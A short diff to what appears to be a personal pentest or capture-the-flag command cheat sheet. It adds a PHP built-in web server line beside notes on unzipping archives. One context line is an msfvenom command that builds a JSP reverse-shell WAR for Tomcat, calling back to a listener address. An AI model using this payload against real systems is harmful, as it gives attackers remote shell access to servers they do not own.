@@ -306,6 +306,9 @@ When doing sql queries, if you add \G to the end, it will show the fields in a v
 TOMCAT
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=6666 -f war -o rev.war
 
+PHP HTTPSERVER
+php -S 0.0.0.0:8000
+
 UNZIP
 gzip -kd archive.gz
 tar -xvf archive.tar
